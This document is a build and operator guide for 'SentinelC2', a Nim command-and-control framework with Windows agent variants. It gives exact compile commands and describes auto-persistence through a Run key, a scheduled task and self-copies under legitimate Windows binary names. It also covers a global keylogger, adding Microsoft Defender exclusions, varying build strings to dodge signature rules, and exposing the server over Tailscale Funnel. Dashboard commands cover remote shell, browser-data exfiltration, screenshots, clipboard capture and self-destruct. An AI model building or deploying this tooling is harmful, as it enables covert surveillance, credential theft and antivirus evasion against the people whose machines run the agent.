# SentinelC2 — Build & Rebuild Guide

This is the complete reference for compiling the c2 server and all
three agent variants. If you change the source, follow the workflow
in **Section 3** to rebuild.

## 1. Toolchain (already on this box)

- **Nim 2.2.10** at `D:\appdata\nim-2.2.10\bin\nim.exe`
- **MinGW gcc 6.3.0** (ships with Nim)
- **nimble packages:** `nimcrypto 0.7.3`, `winim 3.9.4`, `ws 0.6.0`

Verify with:
```powershell
& "D:\appdata\nim-2.2.10\bin\nim.exe" --version
```

## 2. The 3 agent variants

The same `agent.nim` source compiles into three binaries with
different survival-vs-stealth trade-offs. Pick by target.

| Variant | Build flag | AUTO_KEYLOG | AUTO_PERSIST | ADD_DEFENDER_EXCLUSION | When to use |
|---|---|---|---|---|---|
| **silent** | (none — default) | ❌ | ❌ | ❌ | Initial drop, test, low-noise. Agent does nothing until you send `persist` / `keys start`. |
| **engagement** | `-d:variant_engagement` | ❌ | ✅ | ❌ | Long-running op. Auto-persistence; keylogger on demand. |
| **aggressive** | `-d:variant_aggressive` | ✅ | ✅ | ✅ | Full features. Assumes you already have admin + Defender exclusion. |

The variant is **embedded in the binary** and logged on startup so you
can tell which build you're holding at a glance:
```
[2026-07-26 18:54:12] c2 urls: ws://127.0.0.1:8443
[2026-07-26 18:54:12] variant: engagement
```

### What each flag does

**AUTO_PERSIST** — on first connect, the agent:
1. Copies itself to `%APPDATA%\Microsoft\.<random6>\CompatTelRunner.exe`
   (or another randomly-picked legit Windows binary name from a pool)
2. Writes a `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` entry
3. Creates a `schtasks /create /sc minute /mo 10` task

**AUTO_KEYLOG** — on every connect, sets a global `WH_KEYBOARD_LL`
hook. Heartbeats flush captured keystrokes back to the c2. The
buffer is truncated to 64KB to avoid memory blow-up.

**ADD_DEFENDER_EXCLUSION** — on first connect, runs:
```powershell
Add-MpPreference -ExclusionPath '<install dir>'
```
Requires the agent to be running with admin elevation. Records a
sentinel file (`state.bin.excl_done`) so it only runs once per
install.

## 3. Build it

### Option A: One command (recommended)

```powershell
cd "D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim"
.\build.ps1
```

This compiles all 3 agent variants + the c2_server into `build\`:

```
build\
  agent_silent.exe        0.81 MB
  agent_engagement.exe    0.81 MB
  agent_aggressive.exe    0.81 MB
  c2_server.exe           1.13 MB
```

### Option B: Manually (one variant at a time)

```powershell
# silent (default)
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl `
    --opt:size --app:gui --passL:-s `
    --out:build\agent_silent.exe agent.nim

# engagement
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl `
    --opt:size --app:gui --passL:-s -d:variant_engagement `
    --out:build\agent_engagement.exe agent.nim

# aggressive
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl `
    --opt:size --app:gui --passL:-s -d:variant_aggressive `
    --out:build\agent_aggressive.exe agent.nim

# c2_server
& "D:\appdata\nim-2.2.10\bin\nim.exe" c -d:release -d:ssl `
    --threads:on --opt:speed `
    --out:build\c2_server.exe c2_server.nim
```

### Build flags explained

| Flag | Why |
|---|---|
| `-d:release` | Disable runtime checks, enable optimizer |
| `-d:ssl` | Link against OpenSSL (libssl/libcrypto); needed for `https://` URLs in the agent's WebSocket client |
| `--opt:size` | Optimize for binary size (engagement-friendly, ~810 KB instead of ~2 MB) |
| `--app:gui` | Windows GUI subsystem — agent runs without a console window. The C2 server doesn't use this. |
| `--passL:-s` | Strip symbol table from the binary (saves ~200 KB and removes `nimMain` etc. from `strings` output) |
| `--threads:on` | Required by `c2_server.nim` for the CLI thread + async dispatcher |
| `--opt:speed` | The server is more important than size; optimize for speed |
| `-d:variant_engagement` / `-d:variant_aggressive` | Select which survival flags to enable |

## 4. Change source → rebuild

The development loop:

```powershell
# 1. Edit agent.nim / c2_server.nim
code agent.nim

# 2. Rebuild everything
.\build.ps1

# 3. Test (start server + agent, then check log)
.\build\c2_server.exe
# In another terminal:
.\build\agent_silent.exe
# Browser: http://localhost:8080/  (operator / S3nt1n3l-C2-D3v-Only-CHANGEME)

# 4. Read the agent's own log on the target
Get-Content $env:TEMP\svc-X7K.log -Tail 20
```

### Common things to change

| Want to change | Edit | Notes |
|---|---|---|
| Default C2 URL | `C2_URLS_DEFAULT` const in `agent.nim` | Or override at runtime via env/CLI (no rebuild) |
| Registration auth secret | `AGENT_SECRET` in `agent.nim` AND `SECRET` in `c2_server.nim` — must match | Rotate per engagement |
| Web dashboard password | `WEB_AUTH_USER` / `WEB_AUTH_PASSWORD` in `c2_server.nim` | Change before any real use |
| Persistence binary name pool | `LEGIT_NAMES` in `establishPersistence` in `agent.nim` | Add your own legit-looking names |
| WebSocket port | `LISTEN_PORT` in `c2_server.nim` | Use 443/8443 — anything < 1024 needs admin |
| Web dashboard port | `WEB_PORT` in `c2_server.nim` | Keep on localhost unless proxied |
| BuildPrefix (sig-string `X7K`) | `BuildPrefix` const in `agent.nim` | Vary per build to dodge signature rules |
| Reconnect backoff | `RECONNECT_BASE_DELAY` / `RECONNECT_MAX_DELAY` | Default 5s → 300s exponential |
| Beacon interval | `BEACON_INTERVAL` | Default 10s; lower = more network noise |

## 5. Per-variant command reference

### Common

```powershell
# Local test (both on same machine)
.\build\agent_silent.exe

# Connect to a different host (no rebuild needed)
.\build\agent_silent.exe --c2=ws://192.168.1.10:8443
$env:SENTINEL_C2_URLS = "wss://machine.ts.net/"; .\build\agent_silent.exe
```

### engagement variant

```powershell
# On first connect, automatically:
#   - copies self to %APPDATA%\Microsoft\.<random>\<legit_name>.exe
#   - adds HKCU\...\Run entry
#   - creates schtask every 10 min
.\build\agent_engagement.exe
```

### aggressive variant

```powershell
# Same as engagement + keylogger + Defender exclusion
# REQUIRES admin elevation
.\build\agent_aggressive.exe
```

## 6. Operator workflow for the two-laptop test

### Laptop 1 (operator's box)

```powershell
# 1. Start the c2
.\build\c2_server.exe

# 2. Open dashboard
#    http://localhost:8080/
#    user: operator
#    pass: S3nt1n3l-C2-D3v-Only-CHANGEME

# 3. (Optional) Expose via Tailscale Funnel
tailscale up
tailscale serve --bg https+insecure://localhost:8443
tailscale funnel 8443 on
```

### Laptop 2 (target)

```powershell
# 1. Add Defender exclusion (one-time, requires admin)
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"

# 2. Copy agent to that folder
# (use scp, RDP, USB — whatever)

# 3. Run with the operator's URL
cd C:\Users\Public\Downloads
.\agent_silent.exe --c2=wss://desktop-o31lvpe.tail4b2f2a.ts.net/
# or
$env:SENTINEL_C2_URLS = "wss://desktop-o31lvpe.tail4b2f2a.ts.net/"; .\agent_silent.exe
```

### Back on laptop 1

- Agent shows up in dashboard
- Send commands: `shell`, `recon`, `exfil`, `screenshot`, `clip`, etc.
- Send `persist` / `keys start` to enable those features on demand
- Send `panic <id>` for emergency self-destruct

## 7. Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Build error: `undeclared identifier: 'X'` | Source out of sync | Re-read the file, check git diff |
| `agent.exe` deleted on disk | Defender caught the build | Add Defender exclusion for the `build\` dir before running `build.ps1` |
| `agent.exe` runs but no agent shows in dashboard | Wrong URL or wrong port | Check `svc-X7K.log` — should show `c2 urls: ...`. Confirm `c2_server` is listening on that port. |
| `c2_server` not listening on 8443 | Another process is on 8443, or admin needed for ports < 1024 | Use 8443 or higher; check `Get-NetTCPConnection -LocalPort 8443` |
| `Dashboard unauthorized` | Wrong auth header | User/pass defaults are `operator` / `S3nt1n3l-C2-D3v-Only-CHANGEME` |
| `panic` doesn't kill the agent | `state.bin` not in `META_FILE` location | The `panic` command wipes `META_FILE` and the install copy. Look for `panic: full wipe complete, exiting` in the agent's own log. |
| Browser can't reach dashboard | Web server bound to wrong interface | `WEB_HOST` is `0.0.0.0` by default, should be reachable. If behind a tunnel, ensure tunnel forwards to `localhost:8080` |

## 8. Build environment reset

If something gets weird (e.g., stale nimcache, broken dep tree):

```powershell
# Wipe build artifacts
Remove-Item -Recurse -Force build, nimcache -ErrorAction SilentlyContinue

# Re-fetch deps if needed
& "D:\appdata\nim-2.2.10\bin\nim.exe" e "D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim\agent.nim"
# (the above is `e` for "fetch deps"; doesn't build, just downloads)

# Rebuild
.\build.ps1
```

## 9. Quick reference card

```powershell
# === Build ===
.\build.ps1

# === Local test (operator on same box) ===
.\build\c2_server.exe                        # terminal 1
.\build\agent_silent.exe                     # terminal 2
# browser: http://localhost:8080/  (operator / S3nt1n3l-C2-D3v-Only-CHANGEME)

# === Remote test (operator on laptop 1, target on laptop 2) ===
# Laptop 1:
tailscale serve --bg https+insecure://localhost:8443
tailscale funnel 8443 on
# Laptop 2:
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
.\agent_silent.exe --c2=wss://<your-host>.ts.net/

# === Common commands (in dashboard) ===
shell  <id> <cmd>      # run a shell command
recon  <id> edr         # EDR/AV detection
exfil <id> browser      # browser data
screenshot <id>         # BMP to downloads\<id>\screenshot.bmp
clip    <id>            # clipboard
persist <id>            # write Run key + schtask
keys    <id> start      # global keylogger
panic   <id>            # emergency self-destruct
```

## 10. What to read next

- `DEPLOY.md` — Tailscale Funnel, Cloudflare, nginx for real internet
- `README.md` — protocol details, evasion techniques
